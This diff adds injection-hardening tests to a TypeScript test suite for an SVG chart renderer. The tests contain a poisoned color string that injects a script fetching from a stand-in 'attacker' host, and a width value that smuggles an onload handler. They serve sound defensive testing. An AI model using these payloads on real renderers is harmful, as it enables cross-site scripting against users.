@@ -1,6 +1,6 @@
 /* eslint-disable testing-library/render-result-naming-convention */
 import { describe, it, expect } from 'vitest';
-import { renderChartSvg } from './chartRenderer';
+import { renderChartSvg, type ChartRendererInput } from './chartRenderer';
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -172,5 +172,101 @@ describe('renderChartSvg — pie', () => {
 describe('renderChartSvg — errors', () => {
   it('throws for an unknown chart type', () => {
     expect(() => renderChartSvg({ type: 'radar' as never })).toThrow(/unknown chart type/i);
+  });
+});
+
+// ── Security: attribute/markup injection (finding 1.3) ──────────────────────────
+
+describe('renderChartSvg — injection hardening', () => {
+  const POISONED_COLOR = 'red" /><script>fetch("https://attacker/x")</script><rect fill="red';
+
+  it('drops a poisoned colors entry so no <script> can be injected', () => {
+    const svg = renderChartSvg({
+      type: 'bar',
+      data: SIMPLE_DATA,
+      colors: [POISONED_COLOR],
+    });
+    // The dangerous markup must be entirely absent from the output — not merely
+    // re-escaped. The poisoned fill is replaced with a safe default color.
+    expect(svg).not.toContain('<script');
+    expect(svg).not.toContain('</script>');
+    expect(svg).not.toContain('fetch(');
+    expect(svg).not.toContain(POISONED_COLOR);
+    // A valid default hex color is used in its place.
+    expect(svg).toMatch(/fill="#[0-9a-fA-F]{3,8}"/);
+  });
+
+  it('sanitizes poisoned colors across every chart type', () => {
+    const inputs: ChartRendererInput[] = [
+      { type: 'bar', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
+      { type: 'line', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
+      { type: 'pie', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
+      { type: 'donut', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
+      {
+        type: 'scatter',
+        data: [
+          { label: '1', value: 5 },
+          { label: '2', value: 8 },
+        ],
+        colors: [POISONED_COLOR],
+      },
+      {
+        type: 'stacked_bar',
+        xLabels: ['Q1', 'Q2'],
+        series: [{ name: 'A', values: [1, 2] }],
+        colors: [POISONED_COLOR],
+      },
+    ];
+    for (const input of inputs) {
+      const svg = renderChartSvg(input);
+      expect(svg, `chart type ${input.type}`).not.toContain('<script');
+      expect(svg, `chart type ${input.type}`).not.toContain('fetch(');
+      expect(svg, `chart type ${input.type}`).not.toContain(POISONED_COLOR);
+    }
+  });
+
+  it('keeps valid hex colors and replaces only the poisoned entry', () => {
+    const svg = renderChartSvg({
+      type: 'bar',
+      data: SIMPLE_DATA,
+      colors: ['#ff0000', POISONED_COLOR, '#0000ff'],
+    });
+    // Valid entries survive.
+    expect(svg).toContain('#ff0000');
+    expect(svg).toContain('#0000ff');
+    // The poisoned entry is gone; a safe default takes its slot (index 1).
+    expect(svg).not.toContain('<script');
+    expect(svg).not.toContain(POISONED_COLOR);
+    expect(svg).toContain('#f28e2b'); // DEFAULT_COLORS[1]
+  });
+
+  it('falls back to default dimensions for a non-numeric width/height', () => {
+    const svg = renderChartSvg({
+      type: 'bar',
+      data: SIMPLE_DATA,
+      width: '600" onload="alert(1)' as unknown as number,
+      height: Number.NaN,
+    });
+    expect(svg).toContain('width="600"');
+    expect(svg).toContain('height="400"');
+    expect(svg).not.toContain('onload');
+  });
+
+  it('falls back to default dimensions for absurdly large values', () => {
+    const svg = renderChartSvg({
+      type: 'bar',
+      data: SIMPLE_DATA,
+      width: 10 ** 12,
+      height: -50,
+    });
+    expect(svg).toContain('width="600"');
+    expect(svg).toContain('height="400"');
+    expect(svg).not.toContain('1000000000000');
+  });
+
+  it('still honors valid custom dimensions', () => {
+    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA, width: 800, height: 500 });
+    expect(svg).toContain('width="800"');
+    expect(svg).toContain('height="500"');
   });
 });
